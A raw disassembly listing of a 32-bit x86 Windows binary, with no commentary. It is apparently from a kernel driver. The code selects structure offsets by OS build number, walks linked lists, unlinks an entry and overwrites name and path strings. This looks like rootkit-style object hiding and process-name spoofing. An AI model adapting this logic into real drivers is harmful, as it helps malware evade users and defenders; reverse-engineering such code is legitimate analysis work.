  4032d7:	81 f9 71 17 00 00    	cmp    $0x1771,%ecx
  4032dd:	74 08                	je     0x4032e7
  4032df:	81 f9 72 17 00 00    	cmp    $0x1772,%ecx
  4032e5:	75 3e                	jne    0x403325
  4032e7:	83 7c 24 08 06       	cmpl   $0x6,0x8(%esp)
  4032ec:	0f 85 53 02 00 00    	jne    0x403545
  4032f2:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4032f7:	0f 85 48 02 00 00    	jne    0x403545
  4032fd:	c7 06 9c 00 00 00    	movl   $0x9c,(%esi)
  403303:	c7 46 04 a0 00 00 00 	movl   $0xa0,0x4(%esi)
  40330a:	c7 46 08 4c 01 00 00 	movl   $0x14c,0x8(%esi)
  403311:	c7 46 0c cc 01 00 00 	movl   $0x1cc,0xc(%esi)
  403318:	c7 46 10 10 01 00 00 	movl   $0x110,0x10(%esi)
  40331f:	5f                   	pop    %edi
  403320:	5b                   	pop    %ebx
  403321:	83 c4 0c             	add    $0xc,%esp
  403324:	c3                   	ret
  403325:	81 f9 b0 1d 00 00    	cmp    $0x1db0,%ecx
  40332b:	74 08                	je     0x403335
  40332d:	81 f9 b1 1d 00 00    	cmp    $0x1db1,%ecx
  403333:	75 3e                	jne    0x403373
  403335:	83 7c 24 08 06       	cmpl   $0x6,0x8(%esp)
  40333a:	0f 85 05 02 00 00    	jne    0x403545
  403340:	83 7c 24 0c 01       	cmpl   $0x1,0xc(%esp)
  403345:	0f 85 fa 01 00 00    	jne    0x403545
  40334b:	c7 06 b4 00 00 00    	movl   $0xb4,(%esi)
  403351:	c7 46 04 b8 00 00 00 	movl   $0xb8,0x4(%esi)
  403358:	c7 46 08 6c 01 00 00 	movl   $0x16c,0x8(%esi)
  40335f:	c7 46 0c ec 01 00 00 	movl   $0x1ec,0xc(%esi)
  403366:	c7 46 10 28 01 00 00 	movl   $0x128,0x10(%esi)
  40336d:	5f                   	pop    %edi
  40336e:	5b                   	pop    %ebx
  40336f:	83 c4 0c             	add    $0xc,%esp
  403372:	c3                   	ret
  403373:	81 f9 f0 23 00 00    	cmp    $0x23f0,%ecx
  403379:	75 12                	jne    0x40338d
  40337b:	83 7c 24 08 06       	cmpl   $0x6,0x8(%esp)
  403380:	0f 85 bf 01 00 00    	jne    0x403545
  403386:	83 7c 24 0c 02       	cmpl   $0x2,0xc(%esp)
  40338b:	eb 18                	jmp    0x4033a5
  40338d:	81 f9 80 25 00 00    	cmp    $0x2580,%ecx
  403393:	75 3e                	jne    0x4033d3
  403395:	83 7c 24 08 06       	cmpl   $0x6,0x8(%esp)
  40339a:	0f 85 a5 01 00 00    	jne    0x403545
  4033a0:	83 7c 24 0c 03       	cmpl   $0x3,0xc(%esp)
  4033a5:	0f 85 9a 01 00 00    	jne    0x403545
  4033ab:	c7 06 b4 00 00 00    	movl   $0xb4,(%esi)
  4033b1:	c7 46 04 b8 00 00 00 	movl   $0xb8,0x4(%esi)
  4033b8:	c7 46 08 70 01 00 00 	movl   $0x170,0x8(%esi)
  4033bf:	c7 46 0c 84 01 00 00 	movl   $0x184,0xc(%esi)
  4033c6:	c7 46 10 1c 01 00 00 	movl   $0x11c,0x10(%esi)
  4033cd:	5f                   	pop    %edi
  4033ce:	5b                   	pop    %ebx
  4033cf:	83 c4 0c             	add    $0xc,%esp
  4033d2:	c3                   	ret
  4033d3:	81 f9 84 26 00 00    	cmp    $0x2684,%ecx
  4033d9:	75 12                	jne    0x4033ed
  4033db:	83 7c 24 08 06       	cmpl   $0x6,0x8(%esp)
  4033e0:	0f 85 5f 01 00 00    	jne    0x403545
  4033e6:	83 7c 24 0c 04       	cmpl   $0x4,0xc(%esp)
  4033eb:	eb 20                	jmp    0x40340d
  4033ed:	81 f9 5a 27 00 00    	cmp    $0x275a,%ecx
  4033f3:	74 08                	je     0x4033fd
  4033f5:	81 f9 00 28 00 00    	cmp    $0x2800,%ecx
  4033fb:	75 3e                	jne    0x40343b
  4033fd:	83 7c 24 08 0a       	cmpl   $0xa,0x8(%esp)
  403402:	0f 85 3d 01 00 00    	jne    0x403545
  403408:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40340d:	0f 85 32 01 00 00    	jne    0x403545
  403413:	c7 06 b4 00 00 00    	movl   $0xb4,(%esi)
  403419:	c7 46 04 b8 00 00 00 	movl   $0xb8,0x4(%esi)
  403420:	c7 46 08 70 01 00 00 	movl   $0x170,0x8(%esi)
  403427:	c7 46 0c 84 01 00 00 	movl   $0x184,0xc(%esi)
  40342e:	c7 46 10 24 01 00 00 	movl   $0x124,0x10(%esi)
  403435:	5f                   	pop    %edi
  403436:	5b                   	pop    %ebx
  403437:	83 c4 0c             	add    $0xc,%esp
  40343a:	c3                   	ret
  40343b:	81 f9 5a 29 00 00    	cmp    $0x295a,%ecx
  403441:	74 10                	je     0x403453
  403443:	81 f9 d7 37 00 00    	cmp    $0x37d7,%ecx
  403449:	74 08                	je     0x403453
  40344b:	81 f9 39 38 00 00    	cmp    $0x3839,%ecx
  403451:	75 3e                	jne    0x403491
  403453:	83 7c 24 08 0a       	cmpl   $0xa,0x8(%esp)
  403458:	0f 85 e7 00 00 00    	jne    0x403545
  40345e:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  403463:	0f 85 dc 00 00 00    	jne    0x403545
  403469:	c7 06 b4 00 00 00    	movl   $0xb4,(%esi)
  40346f:	c7 46 04 b8 00 00 00 	movl   $0xb8,0x4(%esi)
  403476:	c7 46 08 74 01 00 00 	movl   $0x174,0x8(%esi)
  40347d:	c7 46 0c 88 01 00 00 	movl   $0x188,0xc(%esi)
  403484:	c7 46 10 24 01 00 00 	movl   $0x124,0x10(%esi)
  40348b:	5f                   	pop    %edi
  40348c:	5b                   	pop    %ebx
  40348d:	83 c4 0c             	add    $0xc,%esp
  403490:	c3                   	ret
  403491:	81 f9 d7 3a 00 00    	cmp    $0x3ad7,%ecx
  403497:	74 28                	je     0x4034c1
  403499:	81 f9 ab 3f 00 00    	cmp    $0x3fab,%ecx
  40349f:	74 20                	je     0x4034c1
  4034a1:	81 f9 ee 42 00 00    	cmp    $0x42ee,%ecx
  4034a7:	74 18                	je     0x4034c1
  4034a9:	81 f9 63 45 00 00    	cmp    $0x4563,%ecx
  4034af:	74 10                	je     0x4034c1
  4034b1:	81 f9 ba 47 00 00    	cmp    $0x47ba,%ecx
  4034b7:	74 08                	je     0x4034c1
  4034b9:	81 f9 bb 47 00 00    	cmp    $0x47bb,%ecx
  4034bf:	75 36                	jne    0x4034f7
  4034c1:	83 7c 24 08 0a       	cmpl   $0xa,0x8(%esp)
  4034c6:	75 7d                	jne    0x403545
  4034c8:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4034cd:	75 76                	jne    0x403545
  4034cf:	c7 06 b4 00 00 00    	movl   $0xb4,(%esi)
  4034d5:	c7 46 04 b8 00 00 00 	movl   $0xb8,0x4(%esi)
  4034dc:	c7 46 08 7c 01 00 00 	movl   $0x17c,0x8(%esi)
  4034e3:	c7 46 0c 90 01 00 00 	movl   $0x190,0xc(%esi)
  4034ea:	c7 46 10 2c 01 00 00 	movl   $0x12c,0x10(%esi)
  4034f1:	5f                   	pop    %edi
  4034f2:	5b                   	pop    %ebx
  4034f3:	83 c4 0c             	add    $0xc,%esp
  4034f6:	c3                   	ret
  4034f7:	81 f9 61 4a 00 00    	cmp    $0x4a61,%ecx
  4034fd:	74 10                	je     0x40350f
  4034ff:	81 f9 62 4a 00 00    	cmp    $0x4a62,%ecx
  403505:	74 08                	je     0x40350f
  403507:	81 f9 63 4a 00 00    	cmp    $0x4a63,%ecx
  40350d:	75 36                	jne    0x403545
  40350f:	83 7c 24 08 0a       	cmpl   $0xa,0x8(%esp)
  403514:	75 2f                	jne    0x403545
  403516:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40351b:	75 28                	jne    0x403545
  40351d:	c7 06 e4 00 00 00    	movl   $0xe4,(%esi)
  403523:	c7 46 04 e8 00 00 00 	movl   $0xe8,0x4(%esi)
  40352a:	c7 46 08 ac 01 00 00 	movl   $0x1ac,0x8(%esi)
  403531:	c7 46 0c c0 01 00 00 	movl   $0x1c0,0xc(%esi)
  403538:	c7 46 10 5c 01 00 00 	movl   $0x15c,0x10(%esi)
  40353f:	5f                   	pop    %edi
  403540:	5b                   	pop    %ebx
  403541:	83 c4 0c             	add    $0xc,%esp
  403544:	c3                   	ret
  403545:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  40354a:	5f                   	pop    %edi
  40354b:	5b                   	pop    %ebx
  40354c:	83 c4 0c             	add    $0xc,%esp
  40354f:	c3                   	ret
  403550:	55                   	push   %ebp
  403551:	56                   	push   %esi
  403552:	57                   	push   %edi
  403553:	8b f8                	mov    %eax,%edi
  403555:	bd 01 00 00 c0       	mov    $0xc0000001,%ebp
  40355a:	ff 15 a8 60 40 00    	call   *0x4060a8
  403560:	8b 77 04             	mov    0x4(%edi),%esi
  403563:	8d 0c 06             	lea    (%esi,%eax,1),%ecx
  403566:	8d 51 04             	lea    0x4(%ecx),%edx
  403569:	8b c1                	mov    %ecx,%eax
  40356b:	39 0a                	cmp    %ecx,(%edx)
  40356d:	74 13                	je     0x403582
  40356f:	8b 3f                	mov    (%edi),%edi
  403571:	2b c6                	sub    %esi,%eax
  403573:	39 1c 07             	cmp    %ebx,(%edi,%eax,1)
  403576:	74 12                	je     0x40358a
  403578:	8b 02                	mov    (%edx),%eax
  40357a:	39 48 04             	cmp    %ecx,0x4(%eax)
  40357d:	8d 50 04             	lea    0x4(%eax),%edx
  403580:	75 ef                	jne    0x403571
  403582:	5f                   	pop    %edi
  403583:	5e                   	pop    %esi
  403584:	8b c5                	mov    %ebp,%eax
  403586:	5d                   	pop    %ebp
  403587:	c2 04 00             	ret    $0x4
  40358a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40358e:	5f                   	pop    %edi
  40358f:	5e                   	pop    %esi
  403590:	89 01                	mov    %eax,(%ecx)
  403592:	33 c0                	xor    %eax,%eax
  403594:	5d                   	pop    %ebp
  403595:	c2 04 00             	ret    $0x4
  403598:	cc                   	int3
  403599:	cc                   	int3
  40359a:	cc                   	int3
  40359b:	cc                   	int3
  40359c:	cc                   	int3
  40359d:	cc                   	int3
  40359e:	cc                   	int3
  40359f:	cc                   	int3
  4035a0:	83 ec 14             	sub    $0x14,%esp
  4035a3:	33 c0                	xor    %eax,%eax
  4035a5:	56                   	push   %esi
  4035a6:	57                   	push   %edi
  4035a7:	8d 74 24 08          	lea    0x8(%esp),%esi
  4035ab:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
  4035b0:	89 44 24 08          	mov    %eax,0x8(%esp)
  4035b4:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4035b8:	89 44 24 10          	mov    %eax,0x10(%esp)
  4035bc:	89 44 24 14          	mov    %eax,0x14(%esp)
  4035c0:	89 44 24 18          	mov    %eax,0x18(%esp)
  4035c4:	e8 57 fc ff ff       	call   0x403220
  4035c9:	85 c0                	test   %eax,%eax
  4035cb:	7c 4d                	jl     0x40361a
  4035cd:	ff 15 a8 60 40 00    	call   *0x4060a8
  4035d3:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4035d7:	03 c6                	add    %esi,%eax
  4035d9:	83 38 00             	cmpl   $0x0,(%eax)
  4035dc:	8b c8                	mov    %eax,%ecx
  4035de:	75 06                	jne    0x4035e6
  4035e0:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4035e4:	74 34                	je     0x40361a
  4035e6:	8b 54 24 08          	mov    0x8(%esp),%edx
  4035ea:	2b d6                	sub    %esi,%edx
  4035ec:	8d 64 24 00          	lea    0x0(%esp),%esp
  4035f0:	39 1c 0a             	cmp    %ebx,(%edx,%ecx,1)
  4035f3:	74 0f                	je     0x403604
  4035f5:	8b 49 04             	mov    0x4(%ecx),%ecx
  4035f8:	3b c8                	cmp    %eax,%ecx
  4035fa:	75 f4                	jne    0x4035f0
  4035fc:	8b c7                	mov    %edi,%eax
  4035fe:	5f                   	pop    %edi
  4035ff:	5e                   	pop    %esi
  403600:	83 c4 14             	add    $0x14,%esp
  403603:	c3                   	ret
  403604:	8b 41 04             	mov    0x4(%ecx),%eax
  403607:	8b 11                	mov    (%ecx),%edx
  403609:	89 10                	mov    %edx,(%eax)
  40360b:	8b 01                	mov    (%ecx),%eax
  40360d:	8b 51 04             	mov    0x4(%ecx),%edx
  403610:	89 50 04             	mov    %edx,0x4(%eax)
  403613:	89 09                	mov    %ecx,(%ecx)
  403615:	89 49 04             	mov    %ecx,0x4(%ecx)
  403618:	33 ff                	xor    %edi,%edi
  40361a:	8b c7                	mov    %edi,%eax
  40361c:	5f                   	pop    %edi
  40361d:	5e                   	pop    %esi
  40361e:	83 c4 14             	add    $0x14,%esp
  403621:	c3                   	ret
  403622:	cc                   	int3
  403623:	cc                   	int3
  403624:	cc                   	int3
  403625:	cc                   	int3
  403626:	cc                   	int3
  403627:	cc                   	int3
  403628:	cc                   	int3
  403629:	cc                   	int3
  40362a:	cc                   	int3
  40362b:	cc                   	int3
  40362c:	cc                   	int3
  40362d:	cc                   	int3
  40362e:	cc                   	int3
  40362f:	cc                   	int3
  403630:	83 ec 18             	sub    $0x18,%esp
  403633:	33 c0                	xor    %eax,%eax
  403635:	56                   	push   %esi
  403636:	57                   	push   %edi
  403637:	8d 74 24 0c          	lea    0xc(%esp),%esi
  40363b:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
  403640:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403644:	89 44 24 10          	mov    %eax,0x10(%esp)
  403648:	89 44 24 14          	mov    %eax,0x14(%esp)
  40364c:	89 44 24 18          	mov    %eax,0x18(%esp)
  403650:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403654:	e8 c7 fb ff ff       	call   0x403220
  403659:	85 c0                	test   %eax,%eax
  40365b:	7c 38                	jl     0x403695
  40365d:	8d 44 24 08          	lea    0x8(%esp),%eax
  403661:	50                   	push   %eax
  403662:	8b c6                	mov    %esi,%eax
  403664:	e8 e7 fe ff ff       	call   0x403550
  403669:	85 c0                	test   %eax,%eax
  40366b:	7c 28                	jl     0x403695
  40366d:	8b 54 24 14          	mov    0x14(%esp),%edx
  403671:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403675:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  403678:	8b 54 24 24          	mov    0x24(%esp),%edx
  40367c:	83 c2 04             	add    $0x4,%edx
  40367f:	2b d0                	sub    %eax,%edx
  403681:	8a 08                	mov    (%eax),%cl
  403683:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  403686:	40                   	inc    %eax
  403687:	84 c9                	test   %cl,%cl
  403689:	75 f6                	jne    0x403681
  40368b:	33 c0                	xor    %eax,%eax
  40368d:	5f                   	pop    %edi
  40368e:	5e                   	pop    %esi
  40368f:	83 c4 18             	add    $0x18,%esp
  403692:	c2 04 00             	ret    $0x4
  403695:	8b c7                	mov    %edi,%eax
  403697:	5f                   	pop    %edi
  403698:	5e                   	pop    %esi
  403699:	83 c4 18             	add    $0x18,%esp
  40369c:	c2 04 00             	ret    $0x4
  40369f:	cc                   	int3
  4036a0:	83 ec 1c             	sub    $0x1c,%esp
  4036a3:	33 c0                	xor    %eax,%eax
  4036a5:	53                   	push   %ebx
  4036a6:	56                   	push   %esi
  4036a7:	8d 74 24 10          	lea    0x10(%esp),%esi
  4036ab:	89 44 24 10          	mov    %eax,0x10(%esp)
  4036af:	89 44 24 14          	mov    %eax,0x14(%esp)
  4036b3:	89 44 24 18          	mov    %eax,0x18(%esp)
  4036b7:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4036bb:	89 44 24 20          	mov    %eax,0x20(%esp)
  4036bf:	e8 5c fb ff ff       	call   0x403220
  4036c4:	85 c0                	test   %eax,%eax
  4036c6:	7c 4a                	jl     0x403712
  4036c8:	8b 1f                	mov    (%edi),%ebx
  4036ca:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4036ce:	50                   	push   %eax
  4036cf:	8b c6                	mov    %esi,%eax
  4036d1:	e8 7a fe ff ff       	call   0x403550
  4036d6:	85 c0                	test   %eax,%eax
  4036d8:	7c 38                	jl     0x403712
  4036da:	8d 47 04             	lea    0x4(%edi),%eax
  4036dd:	8b c8                	mov    %eax,%ecx
  4036df:	8d 71 01             	lea    0x1(%ecx),%esi
  4036e2:	8a 11                	mov    (%ecx),%dl
  4036e4:	41                   	inc    %ecx
  4036e5:	84 d2                	test   %dl,%dl
  4036e7:	75 f9                	jne    0x4036e2
  4036e9:	2b ce                	sub    %esi,%ecx
  4036eb:	41                   	inc    %ecx
  4036ec:	83 f9 0f             	cmp    $0xf,%ecx
  4036ef:	77 21                	ja     0x403712
  4036f1:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4036f5:	8b 54 24 18          	mov    0x18(%esp),%edx
  4036f9:	03 d1                	add    %ecx,%edx
  4036fb:	2b d0                	sub    %eax,%edx
  4036fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  403700:	8a 08                	mov    (%eax),%cl
  403702:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  403705:	40                   	inc    %eax
  403706:	84 c9                	test   %cl,%cl
  403708:	75 f6                	jne    0x403700
  40370a:	33 c0                	xor    %eax,%eax
  40370c:	5e                   	pop    %esi
  40370d:	5b                   	pop    %ebx
  40370e:	83 c4 1c             	add    $0x1c,%esp
  403711:	c3                   	ret
  403712:	5e                   	pop    %esi
  403713:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  403718:	5b                   	pop    %ebx
  403719:	83 c4 1c             	add    $0x1c,%esp
  40371c:	c3                   	ret
  40371d:	cc                   	int3
  40371e:	cc                   	int3
  40371f:	cc                   	int3
  403720:	83 ec 18             	sub    $0x18,%esp
  403723:	33 c0                	xor    %eax,%eax
  403725:	56                   	push   %esi
  403726:	57                   	push   %edi
  403727:	8d 74 24 0c          	lea    0xc(%esp),%esi
  40372b:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40372f:	89 44 24 10          	mov    %eax,0x10(%esp)
  403733:	89 44 24 14          	mov    %eax,0x14(%esp)
  403737:	89 44 24 18          	mov    %eax,0x18(%esp)
  40373b:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40373f:	e8 dc fa ff ff       	call   0x403220
  403744:	85 c0                	test   %eax,%eax
  403746:	0f 8c 9f 00 00 00    	jl     0x4037eb
  40374c:	8d 44 24 08          	lea    0x8(%esp),%eax
  403750:	50                   	push   %eax
  403751:	8b c6                	mov    %esi,%eax
  403753:	e8 f8 fd ff ff       	call   0x403550
  403758:	85 c0                	test   %eax,%eax
  40375a:	0f 8c 8b 00 00 00    	jl     0x4037eb
  403760:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403764:	8b 54 24 08          	mov    0x8(%esp),%edx
  403768:	8b 34 11             	mov    (%ecx,%edx,1),%esi
  40376b:	8b 3d 80 60 40 00    	mov    0x406080,%edi
  403771:	56                   	push   %esi
  403772:	ff d7                	call   *%edi
  403774:	84 c0                	test   %al,%al
  403776:	74 73                	je     0x4037eb
  403778:	66 83 3e 00          	cmpw   $0x0,(%esi)
  40377c:	74 6d                	je     0x4037eb
  40377e:	66 83 7e 02 00       	cmpw   $0x0,0x2(%esi)
  403783:	74 66                	je     0x4037eb
  403785:	8b 46 04             	mov    0x4(%esi),%eax
  403788:	50                   	push   %eax
  403789:	ff d7                	call   *%edi
  40378b:	84 c0                	test   %al,%al
  40378d:	74 5c                	je     0x4037eb
  40378f:	0f b7 0e             	movzwl (%esi),%ecx
  403792:	83 c1 02             	add    $0x2,%ecx
  403795:	81 f9 10 04 00 00    	cmp    $0x410,%ecx
  40379b:	77 4e                	ja     0x4037eb
  40379d:	8b 4e 04             	mov    0x4(%esi),%ecx
  4037a0:	8b c1                	mov    %ecx,%eax
  4037a2:	8d 70 02             	lea    0x2(%eax),%esi
  4037a5:	66 8b 10             	mov    (%eax),%dx
  4037a8:	83 c0 02             	add    $0x2,%eax
  4037ab:	66 85 d2             	test   %dx,%dx
  4037ae:	75 f5                	jne    0x4037a5
  4037b0:	2b c6                	sub    %esi,%eax
  4037b2:	d1 f8                	sar    $1,%eax
  4037b4:	8d 54 00 02          	lea    0x2(%eax,%eax,1),%edx
  4037b8:	81 fa 10 04 00 00    	cmp    $0x410,%edx
  4037be:	77 2b                	ja     0x4037eb
  4037c0:	8b 54 24 24          	mov    0x24(%esp),%edx
  4037c4:	81 c2 08 01 00 00    	add    $0x108,%edx
  4037ca:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4037d0:	0f b7 01             	movzwl (%ecx),%eax
  4037d3:	66 89 02             	mov    %ax,(%edx)
  4037d6:	83 c1 02             	add    $0x2,%ecx
  4037d9:	83 c2 02             	add    $0x2,%edx
  4037dc:	66 85 c0             	test   %ax,%ax
  4037df:	75 ef                	jne    0x4037d0
  4037e1:	33 c0                	xor    %eax,%eax
  4037e3:	5f                   	pop    %edi
  4037e4:	5e                   	pop    %esi
  4037e5:	83 c4 18             	add    $0x18,%esp
  4037e8:	c2 04 00             	ret    $0x4
  4037eb:	5f                   	pop    %edi
  4037ec:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  4037f1:	5e                   	pop    %esi
  4037f2:	83 c4 18             	add    $0x18,%esp
  4037f5:	c2 04 00             	ret    $0x4
  4037f8:	cc                   	int3
  4037f9:	cc                   	int3
  4037fa:	cc                   	int3
  4037fb:	cc                   	int3
  4037fc:	cc                   	int3
  4037fd:	cc                   	int3
  4037fe:	cc                   	int3
  4037ff:	cc                   	int3
  403800:	83 ec 18             	sub    $0x18,%esp
  403803:	53                   	push   %ebx
  403804:	55                   	push   %ebp
  403805:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  403809:	33 c0                	xor    %eax,%eax
  40380b:	56                   	push   %esi
  40380c:	57                   	push   %edi
  40380d:	8d 74 24 14          	lea    0x14(%esp),%esi
  403811:	89 44 24 14          	mov    %eax,0x14(%esp)
  403815:	89 44 24 18          	mov    %eax,0x18(%esp)
  403819:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40381d:	89 44 24 20          	mov    %eax,0x20(%esp)
  403821:	89 44 24 24          	mov    %eax,0x24(%esp)
  403825:	e8 f6 f9 ff ff       	call   0x403220
  40382a:	85 c0                	test   %eax,%eax
  40382c:	0f 8c ae 00 00 00    	jl     0x4038e0
  403832:	8b 5d 00             	mov    0x0(%ebp),%ebx
  403835:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403839:	50                   	push   %eax
  40383a:	8b c6                	mov    %esi,%eax
  40383c:	e8 0f fd ff ff       	call   0x403550
  403841:	85 c0                	test   %eax,%eax
  403843:	0f 8c 97 00 00 00    	jl     0x4038e0
  403849:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  40384d:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  403851:	8b 34 11             	mov    (%ecx,%edx,1),%esi
  403854:	8b 3d 80 60 40 00    	mov    0x406080,%edi
  40385a:	56                   	push   %esi
  40385b:	ff d7                	call   *%edi
  40385d:	84 c0                	test   %al,%al
  40385f:	74 7f                	je     0x4038e0
  403861:	66 83 3e 00          	cmpw   $0x0,(%esi)
  403865:	74 79                	je     0x4038e0
  403867:	66 83 7e 02 00       	cmpw   $0x0,0x2(%esi)
  40386c:	74 72                	je     0x4038e0
  40386e:	8b 46 04             	mov    0x4(%esi),%eax
  403871:	50                   	push   %eax
  403872:	ff d7                	call   *%edi
  403874:	84 c0                	test   %al,%al
  403876:	74 68                	je     0x4038e0
  403878:	8d bd 08 01 00 00    	lea    0x108(%ebp),%edi
  40387e:	8b c7                	mov    %edi,%eax
  403880:	8d 50 02             	lea    0x2(%eax),%edx
  403883:	66 8b 08             	mov    (%eax),%cx
  403886:	83 c0 02             	add    $0x2,%eax
  403889:	66 85 c9             	test   %cx,%cx
  40388c:	75 f5                	jne    0x403883
  40388e:	2b c2                	sub    %edx,%eax
  403890:	0f b7 56 02          	movzwl 0x2(%esi),%edx
  403894:	d1 f8                	sar    $1,%eax
  403896:	8d 4c 00 02          	lea    0x2(%eax,%eax,1),%ecx
  40389a:	3b ca                	cmp    %edx,%ecx
  40389c:	77 42                	ja     0x4038e0
  40389e:	8b 56 04             	mov    0x4(%esi),%edx
  4038a1:	8b cf                	mov    %edi,%ecx
  4038a3:	0f b7 01             	movzwl (%ecx),%eax
  4038a6:	66 89 02             	mov    %ax,(%edx)
  4038a9:	83 c1 02             	add    $0x2,%ecx
  4038ac:	83 c2 02             	add    $0x2,%edx
  4038af:	66 85 c0             	test   %ax,%ax
  4038b2:	75 ef                	jne    0x4038a3
  4038b4:	8b c7                	mov    %edi,%eax
  4038b6:	8d 50 02             	lea    0x2(%eax),%edx
  4038b9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4038c0:	66 8b 08             	mov    (%eax),%cx
  4038c3:	83 c0 02             	add    $0x2,%eax
  4038c6:	66 85 c9             	test   %cx,%cx
  4038c9:	75 f5                	jne    0x4038c0
  4038cb:	2b c2                	sub    %edx,%eax
  4038cd:	d1 f8                	sar    $1,%eax
  4038cf:	03 c0                	add    %eax,%eax
  4038d1:	66 89 06             	mov    %ax,(%esi)
  4038d4:	33 c0                	xor    %eax,%eax
  4038d6:	5f                   	pop    %edi
  4038d7:	5e                   	pop    %esi
  4038d8:	5d                   	pop    %ebp
  4038d9:	5b                   	pop    %ebx
  4038da:	83 c4 18             	add    $0x18,%esp
  4038dd:	c2 04 00             	ret    $0x4
  4038e0:	5f                   	pop    %edi
  4038e1:	5e                   	pop    %esi
  4038e2:	5d                   	pop    %ebp
  4038e3:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  4038e8:	5b                   	pop    %ebx
  4038e9:	83 c4 18             	add    $0x18,%esp
  4038ec:	c2 04 00             	ret    $0x4
  4038ef:	cc                   	int3
  4038f0:	83 ec 28             	sub    $0x28,%esp
  4038f3:	53                   	push   %ebx
  4038f4:	33 c0                	xor    %eax,%eax
  4038f6:	56                   	push   %esi
  4038f7:	57                   	push   %edi
  4038f8:	8d 74 24 20          	lea    0x20(%esp),%esi
  4038fc:	89 44 24 20          	mov    %eax,0x20(%esp)
  403900:	89 44 24 24          	mov    %eax,0x24(%esp)
  403904:	89 44 24 28          	mov    %eax,0x28(%esp)
  403908:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40390c:	89 44 24 30          	mov    %eax,0x30(%esp)
  403910:	e8 0b f9 ff ff       	call   0x403220
  403915:	85 c0                	test   %eax,%eax
  403917:	0f 8c c6 01 00 00    	jl     0x403ae3
  40391d:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  403921:	8d 44 24 14          	lea    0x14(%esp),%eax
  403925:	50                   	push   %eax
  403926:	8b c6                	mov    %esi,%eax
  403928:	e8 23 fc ff ff       	call   0x403550
  40392d:	85 c0                	test   %eax,%eax
  40392f:	0f 8c ae 01 00 00    	jl     0x403ae3
  403935:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  403939:	51                   	push   %ecx
  40393a:	8d 5c 24 3c          	lea    0x3c(%esp),%ebx
  40393e:	8d 7c 24 20          	lea    0x20(%esp),%edi
  403942:	e8 29 20 00 00       	call   0x405970
  403947:	85 c0                	test   %eax,%eax
  403949:	0f 8c 99 01 00 00    	jl     0x403ae8
  40394f:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403953:	8b 3d 80 60 40 00    	mov    0x406080,%edi
  403959:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  403960:	00 
  403961:	3d 28 0a 00 00       	cmp    $0xa28,%eax
  403966:	75 22                	jne    0x40398a
  403968:	83 7c 24 38 05       	cmpl   $0x5,0x38(%esp)
  40396d:	0f 85 ed 00 00 00    	jne    0x403a60
  403973:	83 7c 24 18 01       	cmpl   $0x1,0x18(%esp)
  403978:	0f 85 e2 00 00 00    	jne    0x403a60
  40397e:	8b 54 24 14          	mov    0x14(%esp),%edx
  403982:	8b b2 38 01 00 00    	mov    0x138(%edx),%esi
  403988:	eb 27                	jmp    0x4039b1
  40398a:	3d ce 0e 00 00       	cmp    $0xece,%eax
  40398f:	75 61                	jne    0x4039f2
  403991:	83 7c 24 38 05       	cmpl   $0x5,0x38(%esp)
  403996:	0f 85 c4 00 00 00    	jne    0x403a60
  40399c:	83 7c 24 18 02       	cmpl   $0x2,0x18(%esp)
  4039a1:	0f 85 b9 00 00 00    	jne    0x403a60
  4039a7:	8b 54 24 14          	mov    0x14(%esp),%edx
  4039ab:	8b b2 24 01 00 00    	mov    0x124(%edx),%esi
  4039b1:	56                   	push   %esi
  4039b2:	ff d7                	call   *%edi
  4039b4:	84 c0                	test   %al,%al
  4039b6:	0f 84 27 01 00 00    	je     0x403ae3
  4039bc:	8b 76 14             	mov    0x14(%esi),%esi
  4039bf:	56                   	push   %esi
  4039c0:	ff d7                	call   *%edi
  4039c2:	84 c0                	test   %al,%al
  4039c4:	0f 84 19 01 00 00    	je     0x403ae3
  4039ca:	8b 06                	mov    (%esi),%eax
  4039cc:	50                   	push   %eax
  4039cd:	ff d7                	call   *%edi
  4039cf:	84 c0                	test   %al,%al
  4039d1:	0f 84 0c 01 00 00    	je     0x403ae3
  4039d7:	8b 0e                	mov    (%esi),%ecx
  4039d9:	8b 51 24             	mov    0x24(%ecx),%edx
  4039dc:	52                   	push   %edx
  4039dd:	ff d7                	call   *%edi
  4039df:	84 c0                	test   %al,%al
  4039e1:	0f 84 fc 00 00 00    	je     0x403ae3
  4039e7:	8b 06                	mov    (%esi),%eax
  4039e9:	8b 48 24             	mov    0x24(%eax),%ecx
